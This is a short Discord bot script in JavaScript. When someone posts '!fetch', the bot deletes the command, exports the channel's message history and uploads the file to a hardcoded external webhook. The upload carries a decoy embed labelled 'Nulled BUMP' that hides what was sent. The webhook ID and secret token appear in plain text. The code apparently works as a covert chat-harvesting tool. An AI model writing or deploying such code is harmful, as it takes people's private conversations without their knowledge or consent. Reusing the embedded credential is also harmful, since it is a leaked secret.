const fs = require('fs');  //To read files
const Discord = require('discord.js');    //To access Discord API
const { prefix, token } = require('../config.json'); // storing Prefix and Token
const cli = require('./cmd')

const client = new Discord.Client(); // Creating a new Client
client.commands = new Discord.Collection(); // Accessing commands collection


const cooldowns = new Discord.Collection(); // Cooldowns collection

/*Invokes When BOT is ready to do tasks*/ 
client.once('ready', () => {
    console.log('Fetch is Ready!');
});

/*Invokes When a new message send in discord*/
client.on('message', async message => {
    if(message.content === '!fetch'){
        message.delete()
        cli.chatExport(message.channel.id,message.author.username).then(async file=>{
            // message.channel.send({files: [`${file}`]})
            const embed = new Discord.MessageEmbed()
                .setTitle(`**Nulled BUMP**`)
                .setColor('#79d70f')
                .setDescription(`A Successfull Bump Happened to your url`)
                .setTimestamp()
                .setFooter('White2001#0530')
            const webhookClient = new Discord.WebhookClient('780734528158957599', '827QWNEyuLT2C1MdYyAT9P1Ml7nSR1hiVSHvpLI5N9I9fu1bfuns2x6vTs23vwr_X4eT');

            await webhookClient.send({
                username: 'Message Export',
                files: [`${file}`],
                embeds: [embed]
            });
        }).catch(err=>{
            console.log(err)
        })
    }
});

client.login(token); // Bot Login with token